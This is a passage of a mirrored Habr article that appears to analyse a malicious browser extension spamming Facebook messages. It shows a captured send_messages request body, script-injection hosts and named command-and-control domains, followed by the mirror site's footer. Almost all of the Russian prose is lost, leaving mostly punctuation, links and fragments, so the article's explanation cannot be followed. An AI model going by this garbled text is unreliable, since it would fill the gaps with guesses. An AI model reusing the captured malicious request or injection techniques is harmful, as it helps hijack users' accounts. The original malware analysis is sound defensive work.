id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> </div><p>Source: <a href="https://habr.com/ru/post/248225/">https://habr.com/ru/post/248225/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../248211/index.html">Simple acceptance of bank card payments in Windows Universal Apps</a></li>
<li><a href="../248213/index.html">The path from beginner to pro: CMS development on the Kohana 3.3 framework</a></li>
<li><a href="../248215/index.html">7 common mistakes when designing a checkout process</a></li>
<li><a href="../248217/index.html">Try / Catch / Finally</a></li>
<li><a href="../248219/index.html">Home automation with openHAB: lighting and remote control of heaters. Part 1</a></li>
<li><a href="../248227/index.html">Pivotal stops developing Groovy & Grails from March 31</a></li>
<li><a href="../248229/index.html">Binary operations on unordered sets</a></li>
<li><a href="../248231/index.html">The main functions of ETL-systems</a></li>
<li><a href="../248235/index.html">I offer a custom .Net questionnaire</a></li>
<li><a href="../248239/index.html">Project Migration from StarTeam to SVN</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>